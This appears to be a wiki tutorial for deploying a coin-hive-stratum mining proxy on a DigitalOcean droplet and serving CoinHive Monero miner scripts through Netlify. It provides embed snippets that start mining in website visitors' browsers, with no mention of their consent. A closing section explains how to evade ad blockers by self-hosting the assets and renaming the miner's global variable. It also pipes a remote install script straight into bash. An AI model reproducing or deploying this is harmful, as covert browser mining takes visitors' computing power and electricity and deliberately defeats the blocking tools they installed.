Deploy [coin-hive-stratum](https://gitlab.com/cazala/coin-hive-stratum) to a DigitalOcean dropplet + Netlify CDN

# Account

Create an account at [DigitalOcean](https://m.do.co/c/f0a21da7be52).

If you sign up with [this link](https://m.do.co/c/f0a21da7be52) you will get $10 on DigitalOcean credit for free.

You can also enter a promo code:

* If you have a student email (ending with .edu) you can get $50 on DigitalOcean credit for free with a [GitHub Student Pack](https://education.github.com/pack). 

* If you don't have a student email, you can use the promo code LOWENDBOX to get $15 for free. 

* If the one above doesn't work, you can use DROPLET10 and get $10 for free. 

# Droplet

After logging in, go to your droplets and create a new one:
￼

![33801081-01a9a1d2-dd2e-11e7-9929-abe4c4040f6b](/uploads/a6a9e8b76cf9a6d0d27d2f67b4bcf3e3/33801081-01a9a1d2-dd2e-11e7-9929-abe4c4040f6b.png)

Choose an Ubuntu image:

![33801080-01883254-dd2e-11e7-81b2-3e00a4d0d07f](/uploads/644fa6ced095d3b993adb5a31df239bb/33801080-01883254-dd2e-11e7-81b2-3e00a4d0d07f.png)
￼
Choose the size:
￼
![33801082-01c9cce6-dd2e-11e7-86b3-42ab26582f4c](/uploads/e840b11c5beb5fc0e91549557ffe82f4/33801082-01c9cce6-dd2e-11e7-86b3-42ab26582f4c.png)

Choose a region:
￼
![33801090-41e6581c-dd2e-11e7-84e0-efa6ffbd9406](/uploads/1d3b271daabe643d497a82586cc2fb53/33801090-41e6581c-dd2e-11e7-84e0-efa6ffbd9406.png)

After creating your droplet you will receive an email with your droplet's credentials:

```
Droplet Name: ubuntu-512mb-nyc3-01
IP Address: 203.0.113.0
Username: root
Password: EXAMPLE71936efe52b9eb4c602
```

Users of Windows without Bash will have to [access their droplet using Putty](https://www.digitalocean.com/community/tutorials/how-to-log-into-your-droplet-with-putty-for-windows-users).

If you use Linux, Mac, or Windows with Bash, you can access your droplet via OpenSSH:

```
ssh root@203.0.113.0
```

Once logged in, run this command:

```
curl -o- https://gitlab.com/cazala/coin-hive-stratum/raw/master/install.sh | bash 
```

This will install `coin-hive-stratum` and all it's dependencies.

Now run this to activate NVM:

```
source ~/.bashrc
```

To configure your proxy, edit the file proxy.js (by default it's pointing to pool.supportxmr.com:3333):

```
vi proxy.js
```

Now you can start your proxy using pm2:

```
pm2 start proxy.js --name=proxy --log-date-format="YYYY-MM-DD HH:mm"
```

Run this to monitor your proxy:

```
pm2 monit
```

And this to stop it:

```
pm2 stop proxy
```

Now you proxy is available via `ws://X.X.X.X` (where `X.X.X.X` is your droplet's IP) !

For example:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
  // Configure CoinHive to point to your proxy
  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://203.0.113.0"]];

  // Start miner
  var miner = CoinHive.Anonymous('your-monero-address');
  miner.start();

</script>
```

# Custom Domain or Subdomain and SSL

Probably you will want to access your proxy from a domain instead of an IP, and be able to use `wss://`

In order to do this you will have to get a domain if you don't have one. 

You can get `.tk`, `.ml`, `.ga`, `.cf` and `.gq` domains for free from [dot.tk](http://www.dot.tk/), or you can buy one from [GoDaddy](https://www.godaddy.com/), [NameCheap](https://www.namecheap.com/), or any other other like those will work.

Once you have your domain, follow this guide:

* [Point your Nameservers to DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-point-to-digitalocean-nameservers-from-common-domain-registrars)

If you already have a domain, and you are using Cloudflare (if you don't, you should) and you want to use your proxy under a subdomain, follow this guide:

* [Cloudflare pointing subdomains to different droplets](https://www.digitalocean.com/community/questions/cloudflare-pointing-subdomains-to-a-different-droplets)

To generate your SSL certificates for your domain or subdomain follow this guide:

* [Use Certbot to retrieve Let's Encrypt SSL certificates](https://www.digitalocean.com/community/tutorials/how-to-use-certbot-standalone-mode-to-retrieve-let-s-encrypt-ssl-certificates)

After you have your domain or subdomain setup and your SSL certificates, just edit the file `proxy_secure.js` and add your domain in the line `const domain = "yourdomain.com"`:

```
vi proxy_secure.js
```

It should look like this:

```
const Proxy = require("coin-hive-stratum");
const domain = "yourdomain.com"
const proxy = new Proxy({
  host: "pool.supportxmr.com",
  port: 3333,
  key: require("fs").readFileSync("/etc/letsencrypt/live/" + domain + "/privkey.pem"),
  cert: require("fs").readFileSync("/etc/letsencrypt/live/" + domain + "/fullchain.pem"),
});
proxy.listen(443);
```

And run your proxy using this instead:

```
pm2 start proxy_secure.js --name=proxy --log-date-format="YYYY-MM-DD HH:mm"
```

Now your proxy will be accesible from your domain and via `wss://`!

For example:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
  // Configure CoinHive to point to your proxy
  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://my-awesome-proxy.com"]];

  // Start miner
  var miner = CoinHive.Anonymous('your-monero-address');
  miner.start();

</script>
```

# Avoid AdBlock

You may also want to host your own assets instead of using CoinHive's to avoid AdBlock.

In order to do that, fork [this repo](https://gitlab.com/cazala/coin-hive-stratum).

![fork](/uploads/095f91e51a26af9cb29319cff3139eb6/fork.gif)

---
￼
Now login to [Netlify](https://netlify.com) and follow this instruction:

* Click on `New site from Git`

* Connect to Gitlab

* Select the repo you just forked: `coin-hive-stratum`

* Select the branch `assets`

* Deploy!

![netlify](/uploads/bba96ae08beae3c0e1684e0b1d18ab72/netlify.gif)

This will give you a url like this:

```
https://priceless-wright-067e2f.netlify.com
```

Now instead of using CoinHive's miner:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

You should use your miner like this:

```html
<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=YOUR-PROXY-URL"></script>
```

This is an example of how it should look like:

```html
<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=wss://my-awesome-proxy.com"></script>
```

Also, instead of using the CoinHive global variable use CH (this is to avoid AdBlock), ie:

```html
<script src="https://priceless-wright-067e2f.netlify.com/m.js?proxy=wss://my-awesome-proxy.com"></script>
<script>
  var miner = CH.Anonymous('MONERO_WALLET_ADDRESS');
  miner.start();
</script>
```
